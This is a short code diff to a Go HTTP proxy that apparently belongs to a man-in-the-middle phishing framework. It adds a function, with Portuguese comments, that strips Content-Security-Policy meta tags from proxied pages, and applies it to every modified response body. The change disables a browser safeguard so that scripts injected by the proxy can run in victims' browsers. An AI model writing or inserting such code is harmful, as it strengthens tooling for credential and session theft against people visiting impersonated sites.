@@ -92,6 +92,16 @@ type ProxySession struct {
 	Index        int
 }
 
+func (p *HttpProxy) removeCSPMetaTags(body []byte) []byte {
+	// Regex para encontrar meta tags CSP
+	cspMetaRegex := regexp.MustCompile(`<meta[^>]*http-equiv=['"]Content-Security-Policy['"][^>]*>`)
+
+	// Remover todas as meta tags CSP
+	body = cspMetaRegex.ReplaceAllLiteral(body, []byte{})
+
+	return body
+}
+
 // set the value of the specified key in the JSON body
 func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
 	var data map[string]interface{}
@@ -1177,6 +1187,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+
+				body = p.removeCSPMetaTags(body)
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
